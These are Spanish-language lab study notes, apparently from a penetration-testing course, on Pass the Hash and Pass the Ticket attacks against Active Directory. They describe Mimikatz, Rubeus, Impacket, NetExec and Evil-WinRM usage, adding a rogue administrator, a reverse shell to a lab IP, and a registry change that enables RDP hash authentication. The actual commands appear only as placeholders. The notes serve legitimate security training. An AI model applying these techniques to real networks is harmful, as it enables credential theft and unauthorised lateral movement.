Es una técnica que consiste en que un atacante utiliza un ``hash`` de contraseña en lugar de la contraseña en texto plano para la autenticación. El atacante no necesita descifrar el hash para obtener una contraseña en texto plano. 

Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 

![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)


> [!NOTE] NOTA:
> Las herramientas que utilizaremos se encuentran en el directorio *C:\tools* en el host de destino. Una vez que inicie la máquina y complete los ejercicios, podrá usar las herramientas en ese directorio. Este laboratorio consta de dos máquinas: *tendrá acceso a una (MS01) y, desde allí, se conectará a la segunda (DC01)*. 


## Introduction to Windows NTML


**El Administrador de LAN de nuevas Tecnologías de Windows (NTML)** de Microsoft, es un conjunto de protocolos de seguridad que autentica la identidad de los usuarios a la vez que protege la integridad y confidencialidad de sus datos. 

NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin necesidad de proporcionar una contraseña.

Con NTLM, las contraseñas almacenadas en el servidor y el controlador de dominio no están "salteadas", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto le llamamos...`Pass the Hash (PtH) Attack`.


### Pass the Hash with Mimikatz (Windows)

Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:


![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)

#### Pass the hash from Windows using Mimikatz

{{CODE_BLOCK_38}}


Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.

![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)


#### Pass the Hash with Powershell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en Windows es ``Invoke-TheHash`` . Esta herramienta es un conjunto de funciones de ``PowerShell`` para realizar ataques de ``Pass the Hash`` con ``WMI`` y ``SMB``.

La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.


![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)



El siguiente comando utilizará el método SMB para la ejecución de comandos para crear un nuevo usuario llamado ``mark`` y agregarlo al grupo ``Administradores``. 


{{CODE_BLOCK_39}}


También podemos obtener una conexión de Shell inversa en la máquina de destino.

Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 

![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)


Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 

![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)


Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 


##### Invoke-Thehash con WMI


{{CODE_BLOCK_40}}

El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 


![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene varias herramientas que podemos utilizar para diferentes operaciones como: `Command Execution` y `Credential Dumping`, `Enumeration`, etc. 


### Pass the Hash with Impacket PsExec

{{CODE_BLOCK_41}}

Hay varias otras herramientas en el kit de herramientas Impacket que podemos usar para la ejecución de comandos mediante ataques Pass the Hash, como:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


# Pass the Hash with NetExec (Linux)

[Netexec](https://github.com/Pennyw0rth/NetExec) es una herramienta de ``post-explotación`` que ayuda a automatizar la evaluación de la seguridad de grandes redes de ``Active Directory``. Podemos usar ``NetExec`` para intentar autenticarnos en algunos o todos los hosts de una red, buscando un host donde podamos autenticarnos correctamente como administrador local. Este método también se denomina "Spray de contraseñas". el módulo `Active Directory Enumeration & Attacks`. Tenga en cuenta que este método puede bloquear cuentas de dominio.



#### Pass the hash with Netexec

{{CODE_BLOCK_42}}


Si queremos realizar las mismas acciones pero intentar autenticarnos en cada host en una subred usando el hash de contraseña del administrador local, podríamos agregar `--local-auth` a nuestro comando. 

Este método es útil si obtenemos un hash de administrador local volcando la base de datos SAM local en un host y queremos comprobar a cuántos otros hosts (si los hay) podemos acceder gracias a la reutilización de la contraseña de administrador.

Si vemos `Pwn3d!` significa que el usuario es administrador local en el equipo de destino. 


#### NetExec - Command Execution

{{CODE_BLOCK_43}}

Revise la [documentación Wiki de NetExec](https://www.netexec.wiki/) para obtener más información sobre las amplias funciones de la herramienta.


# Pass the Hash with Evil-Winrm (Linux)

``Evil-WinRM`` es otra herramienta que podemos usar para autenticarnos mediante el ataque ``"Pasar el Hash"`` con comunicación remota de PowerShell. Si SMB está bloqueado o no tenemos permisos de administrador, podemos usar este protocolo alternativo para conectarnos a la máquina objetivo.

 
## Pass the Hash with Evil-Winrm

{{CODE_BLOCK_44}}


# Pass the Hash with RDP

Podemos realizar un ataque RDP Pth para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Este ataque tiene algunas salvedades:

``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:

![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:

#### Enable Restricted Admin Mode to allow PtH

{{CODE_BLOCK_45}}

![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)


Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:

### Pass the hash via RDP

{{CODE_BLOCK_46}}


![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)


# UAC Pass the Hash Limits for Local Accounts

El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios locales para realizar operaciones de administración remota. Cuando la clave de registro...

``HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`` si se establece en 0, significa que la cuenta de administrador local integrada ``(RID-500, "Administrador")`` es la única cuenta local autorizada para realizar tareas de administración remota. Si se establece en 1, también se permiten las demás cuentas de administrador local. 


> [!NOTE] Nota:
> Hay una excepción, si la clave de registro ``FilterAdministratorToken`` (deshabilitado por defecto) está habilitado (valor 1), la cuenta RID 500 ``(incluso si se le cambia el nombre)`` está inscrita en la protección ``UAC``. Esto significa que el ``PTH remoto`` fallará contra la máquina al usar esa cuenta. 


Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.


![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)

![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)

{{CODE_BLOCK_47}}


## Pass the Ticket (PtT) Windows

Otro método para realizar ataques laterales en un entorno Active Directory se denomina `ataque Pass the Ticket (PtT)`. En este ataque, se utiliza un ticket Kerberos robado para realizar ataques laterales en lugar de un Hash de password NTML.


## Kerberos Protocol Update

El sistema de autenticación Kerberos se basa en tickets. La idea central de Kerberos no es asignar una contraseña a cada servicio que se utiliza.

En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.

![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)

Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.

Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con su contraseña.

## Pass the Ticket (PtT) Attack

Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:

![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)

Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`

### Script

Imaginemos que estamos realizando una prueba de penetración y conseguimos suplantar la identidad de un usuario y acceder a su ordenador. 

Encontramos una forma de obtener privilegios administrativos en este ordenador y trabajamos con derechos de administrador local.


#### Collecting Kerberos tickets from Windows

En Windows, los tickets son procesados ​​y almacenados por el proceso LSASS (Servicio del Subsistema de Autoridad de Seguridad Local). Por lo tanto, para obtener un ticket de un sistema Windows, debe comunicarse con LSASS y solicitarlo.

``Como usuario no administrador, solo puede obtener sus tickets``, pero como administrador local, puede recopilar todo.

Podemos recolectar todos los tickets de un sistema usando el módulo `Mimikatz` `sekurlsa::tickets /export` el resultado es una lista de archivos con la extensión `.kirbi`, que contenían los tickets.


# Mimikatz - Ticket Export

{{CODE_BLOCK_48}}

Los billetes que terminan con ``$``, corresponden a la cuenta del equipo, que necesita un ticket para interactuar con Active Directory. 

Los tickets de usuario contienen el nombre del usuario, seguido de un ...``@`` que separa del servicio y el dominio, por ejemplo: 

``[randomvalue]-username@service-domain.local.kirbi``



> [!NOTE] Nota:
> Si eliges un ticket con el servicio krbtgt, corresponde al TGT de esa cuenta. 

también podemos exportar tickets usando `Rubeus` y la opción `dump` se puede utilizar para volcar todos los tickets (si se ejecuta como administrator local)


# Rubeus - Exports Tickets

{{CODE_BLOCK_49}}



> [!NOTE] Nota:
> 

Para recolectar todos los tickets necesitamos ejecutar ``Mimikatz`` o ``Rubeus`` como administrador.


# Pase el ticket con PowerShell Remoting (Windows) 

PowerShell Remoting permite ejecutar scripts o comandos en un equipo remoto. Los administradores suelen usar PowerShell Remoting para administrar equipos remotos en la red. Al habilitar PowerShell Remoting, se crean escuchas HTTP y HTTPS. La escucha se ejecuta en el puerto estándar TCP/5985 para HTTP y TCP/5986 para HTTPS. 


Supongamos que encontramos una cuenta de usuario sin privilegios administrativos en un equipo remoto, pero que pertenece al grupo Usuarios de administración remota. En ese caso, podemos usar PowerShell Remoting para conectarnos a ese equipo y ejecutar comandos. 


## Mimikatz - PowerShell Remoting with Pass the Ticket


Para usar PowerShell Remoting con Pass the Ticket, podemos usar Mimikatz para importar nuestro ticket y luego abrir una consola de PowerShell y conectarnos a la máquina de destino.

{{CODE_BLOCK_50}}



## Rubeus - PowerShell Remote Connection with Pass the Ticket

Rubeus tiene la opción de `createnetonly`, que crea un proceso de sacrificio/sesión de inicio de sesión ([tipo de inicio de sesión 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). El proceso está oculto por defecto, pero podemos especificar el indicador. `/show` para mostrar el proceso, y el resultado es el equivalente a `runas /netonly`. Esto evita el borrado de los TGT existentes para la sesión de inicio de sesión actual.


### Create a sacrifice process with Rubeus

{{CODE_BLOCK_51}}


El comando anterior abrirá una nueva ventana de comandos. Desde allí, podemos ejecutar Rubeus para solicitar un nuevo TGT con la opción `/ptt` para importar el ticket a nuestra sesión actual  



## Rubeus - Pass the Ticket for lateral movement


{{CODE_BLOCK_52}}



![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)


![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)


{{CODE_BLOCK_53}}

![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)




# Pass the Ticket (Linux)


Aunque no es común, las computadoras Linux pueden conectarse a Active Directory para proporcionar una gestión de identidad centralizada e integrarse con los sistemas de la organización, brindando a los usuarios la capacidad de tener una única identidad para autenticarse en computadoras Linux y Windows. 


Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como método de autenticación. Supongamos que este es el caso y logramos comprometer una máquina Linux conectada a Active Directory. En ese caso, podríamos intentar encontrar tickets Kerberos para suplantar la identidad de otros usuarios y obtener más acceso a la red. 


## Script

Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 

![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)



# Autenticación de Linux mediante reenvío de puertos

{{CODE_BLOCK_54}}


## Identifying Linux and Active Directory Integration


Podemos identificar si la máquina Linux está unida a un dominio usando ``realm`` , una herramienta utilizada para administrar la inscripción del sistema en un dominio y establecer qué usuarios o grupos del dominio tienen permiso para acceder a los recursos del sistema local. 


###### realm - Checks if the Linux machine is joined to the domain
{{CODE_BLOCK_55}}


###### Comprueba si la maquina Linux está unida al dominio

{{CODE_BLOCK_56}}


# Cómo encontrar tickets Kerberos en Linux

Como atacantes, siempre buscamos credenciales. En máquinas unidas a un dominio Linux, buscamos tickets Kerberos para obtener más acceso. Los tickets Kerberos se pueden encontrar en diferentes lugares según la implementación de Linux o si el administrador cambia la configuración predeterminada. Exploremos algunas formas comunes de encontrar tickets Kerberos. 


## Use Find to search for files with keytab in the name

{{CODE_BLOCK_57}}


##### Identificación de archivos KeyTab en Cronjobs 

{{CODE_BLOCK_58}}






---

#password #hash #AD #activeDirectory #SAM #lsass #pass-the-hash

---


